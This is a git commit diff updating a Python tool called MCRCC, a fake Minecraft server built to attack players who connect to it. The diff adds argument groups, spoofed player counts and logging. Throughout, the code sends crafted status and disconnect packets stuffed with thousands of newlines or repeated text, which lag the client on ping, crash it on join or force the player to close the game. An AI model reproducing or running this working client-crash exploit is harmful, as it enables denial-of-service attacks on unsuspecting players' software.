048904f3d496d28969774b892455abc16af44e20
dropsql <dropsql@protonmail.com>
2021-02-26 18:53:25 +0100

    Update main.py

--- main.py
+++ main.py
@@ -6,79 +6,73 @@ import struct
 import argparse
 import itertools
 
+from typing import *
+
 from rich.console import Console
 from rich.table import Table
 
 console = Console(
 )
 
-BANNER = '''
-[green]
-         
-  _____   ___________   ____  ____  
- /     \_/ ___\_  __ \_/ ___\/ ___\ 
-|  Y Y  \  \___|  | \/\  \__\  \___   [white]version 1.0[/white]
-|__|_|  /\___  >__|    \___  >___  >  [white]by github.com/dropsql[/white]
-      \/     \/            \/    \/ 
-[/green]
-[green]m[/green]ine[green]c[/green]raft [green]r[/green]emote [green]c[/green]lient [green]c[/green]rasher
+VERSION = 2.0
+AUTHOR = 'dropskid'
 
-'''
+BANNER = '''[magenta]
+        *-*-*-*-*-*-*-*-*-*
+        *                 *
+        *   [green]MCRCC   {version}[/green]   *
+        *   [pink1]by {author}[/pink1]   *
+        *                 *
+        *-*-*-*-*-*-*-*-*-*
+[/magenta]
+'''.format(
+    version=VERSION,
+    author=AUTHOR
+)
 
 console.print(BANNER)
 
-parser = argparse.ArgumentParser(usage='%(prog)s [options]', add_help=False)
+parser = argparse.ArgumentParser(usage='%(prog)s [options]')
 
-parser.add_argument('-h', '--help', required=False, action='store_true', help='show help menu', dest='help')
-parser.add_argument('-l', '--lhost', default='0.0.0.0', required=False, metavar='', help='local host (default: 0.0.0.0)', dest='host', type=str)
-parser.add_argument('-p', '--port', default=1337, required=False, metavar='', help='local port (default: 1337)', dest='port', type=int)
-parser.add_argument('-m', '--message', default='hello world', required=False, metavar='', help='motd\'s message', dest='message', type=str)
-parser.add_argument('--motd-lag', default=None, required=False, action='store_true', help='make the user\'s mniecraft lag when he ping the server', dest='motd_lag')
-parser.add_argument('--join-crash', default=None, required=False, action='store_true', help='crash the user\'s minecraft when he joins the server', dest='join_crash')
+server_options = parser.add_argument_group('server options')
+
+server_options.add_argument('-l', '--lhost', default='0.0.0.0', required=False, metavar='', help='local host (default: 0.0.0.0)', dest='host', type=str)
+server_options.add_argument('-p', '--port', default=1337, required=False, metavar='', help='local port (default: 1337)', dest='port', type=int)
+
+minecraft_options = parser.add_argument_group('minecraft options')
+minecraft_options.add_argument('-m', '--message', default='hello world', required=False, metavar='', help='motd\'s message', dest='message', type=str)
+minecraft_options.add_argument('-v', '--version', default='friendlyspigot', required=False, metavar='', help='server\'s version', dest='version', type=str)
+minecraft_options.add_argument('--online-players', default=53, required=False, metavar='', help='spoof online players', dest='players_online', type=int)
+minecraft_options.add_argument('--max-players', default=200, required=False, metavar='', help='spoof max players', dest='players_max', type=int)
+
+
+crashing_options = parser.add_argument_group('crashing options')
+crashing_options.add_argument('--slp-lag', default=None, required=False, action='store_true', help='make the user\'s minecraft lag when he ping the server', dest='motd_lag')
+crashing_options.add_argument('--join-crash', default=None, required=False, action='store_true', help='crash the user\'s minecraft when he joins the server', dest='join_crash')
+crashing_options.add_argument('--no-return', default=None, required=False, action='store_true', help='force the user to close minecraft after connecting to the server', dest='force_close')
 
 
 args = parser.parse_args()
 
-table = Table(style='green')
-table.add_column('argument', style='#32a84e', header_style='white')
-table.add_column('default value', style='#32a84e', header_style='white')
-table.add_column('description', style='#32a84e', header_style='white')
-table.add_column('type', style='#32a84e', header_style='white')
-table.add_row('-h/--help', '-', 'show help menu', '-')
-table.add_row('-l/--lhost', '0.0.0.0', 'set local host', 'string')
-table.add_row('-p/--port', '1337', 'set local port', 'int')
-table.add_row('-m/--message', 'hello world', 'set motds message', 'string')
-table.add_row('--motd-lag', '-', 'make the user\'s minecraft lag when he ping the server', 'string')
-table.add_row('--join-crash', '-', 'crash the user\'s minecraft when he joins the server', 'string')
-
-if args.help:
-    console.print(table)
-    sys.exit(-1)
-
 LHOST = args.host
 LPORT = args.port
 MESSAGE = args.message
+VERSION = args.version
+ONLINE_PLAYERS = args.players_online
+MAX_PLAYERS = args.players_max
 
-if not args.motd_lag and not args.join_crash:
-    console.print(table)
+if not args.motd_lag and not args.join_crash and not args.force_close:
+    parser.print_help()
     sys.exit(-1)
 
-def make_rainbow(message : str) -> str:
-    '''
-    make string raibow 
-    '''
-
+def make_rainbow(message: str) -> str:
     colors = itertools.cycle(['§a', '§2', '§b', '§3', '§c', '§4', '§d', '§5', '§e', '§6', '§f', '§7'])
     out = ''
     for char in message:
         out += next(colors) + char
     return out
 
-def varint_unpack(s : bytes) -> tuple[int, str]:
-    '''
-    unpack varint from bytes
-    '''
-
+def varint_unpack(s: bytes) -> Tuple[int, str]:
     d, l = 0, 0
     length = len(s)
     if length > 5:
@@ -92,12 +86,9 @@ def varint_unpack(s : bytes) -> tuple[int, str]:
     return (d, s[l:])
 
 
-def varint_pack(d : int) -> bytes:
-    '''
-    pack int to varint
-    '''
+def varint_pack(d: int) -> bytes:
     o = b''
-    while True:
+    for _ in range(5):
         b = d & 0x7F
         d >>= 7
         o += struct.pack("B", b | (0x80 if d > 0 else 0))
@@ -105,10 +96,7 @@ def varint_pack(d : int) -> bytes:
             break
     return o
 
-def data_pack(data : bytes) -> bytes:
-    '''
-    make a packet understable by minecraft
-    '''
+def data_pack(data: bytes) -> bytes:
     return varint_pack(len(data)) + data
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -116,43 +104,61 @@ server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 server.bind((LHOST, LPORT))
 
-console.log('server listening on %s:%s' % (LHOST, LPORT))
+console.log('fake server server listening on %s:%s' % (LHOST, LPORT))
 server.listen(1337)
 
 while True:
-    remote_socket, remote_addr = server.accept()
     try:
-        buf = remote_socket.recv(1)
-        packet_lenght, _ = varint_unpack(buf)
+        remote_socket, remote_addr = server.accept()
+        try:
+            buf = remote_socket.recv(1)
+            packet_lenght, _ = varint_unpack(buf)
 
-        data = remote_socket.recv(packet_lenght)
-        packet_id, data = varint_unpack(data)
+            data = remote_socket.recv(packet_lenght)
+            packet_id, data = varint_unpack(data)
 
-        packet_id = hex(packet_id)
-        
-        if packet_id == '0x0' and data.endswith(b'\x01'):
-            payload = json.dumps({
-                'version': {
-                    'name': '\n' * 733 if args.motd_lag else 'friendly server', 
-                    'protocol': varint_unpack(data)[0]
-                }, 'players': {
-                    'max': 0,
-                    'online': 1337
-                }, 
-                'description': make_rainbow(MESSAGE) + ('\n' * 5) + ('§ka' * 64 + '\n') * 60 if args.motd_lag else make_rainbow(MESSAGE), 
-                'modinfo': {
-                    'type': 'FML', 
-                    'modList': []
-                },
-            }).encode()
+            packet_id = hex(packet_id)
+            
+            if packet_id == '0x0' and data.endswith(b'\x01'):
+                console.log('%s:%s has pinged the server' % (remote_addr[0], remote_addr[1]))
+                payload = json.dumps({
+                    'version': {
+                        'name': '\n' * 733 if args.motd_lag else VERSION,
+                        'protocol': varint_unpack(data)[0] 
+                    }, 'players': {
+                        'max': MAX_PLAYERS,
+                        'online': ONLINE_PLAYERS,
+                    }, 
+                    'description': make_rainbow(MESSAGE) + ('\n' * 5) + ('§ka' * 64 + '\n') * 60 if args.motd_lag else make_rainbow(MESSAGE), 
+                    'modinfo': {
+                        'type': 'FML', 
+                        'modList': []
+                    },
+                }).encode()
 
-            packet = data_pack(b'\x00' + data_pack(payload))
+                packet = data_pack(b'\x00' + data_pack(payload))
+                remote_socket.send(packet)
+            
+            elif packet_id == '0x0' and data.endswith(b'\x02'):
+                console.log('%s:%s is joining the server' % (remote_addr[0], remote_addr[1]))
 
-            remote_socket.send(packet)
-        
-        elif packet_id == '0x0' and data.endswith(b'\x02') and args.join_crash:
-            packet = data_pack(b'\x00' + data_pack(b'{"text":"' + (b'\n' * 16384) + b'"}'))
-            remote_socket.send(packet)
+                if args.join_crash:
+                    packet = data_pack(b'\x00' + data_pack(b'{"text":"' + (b'\n' * 16384) + b'"}'))
+                    remote_socket.send(packet)
 
-    except Exception as e:
-        pass
+                elif args.force_close:
+                    packet = data_pack(b'\x00' + data_pack(b'{"text":"' + make_rainbow('no_return,' * 1000).encode('utf-8') + b'"}'))
+                    remote_socket.send(packet)
+            remote_socket.close()
+        except:
+            pass
+
+    except KeyboardInterrupt:
+        x = input('are you sure you want to exit (y/n): ').lower()
+        if x == 'y':
+            console.log('stopping server...')
+            server.close()
+            console.log('exiting...')
+            sys.exit(0)
+        elif x == 'n':
+            pass
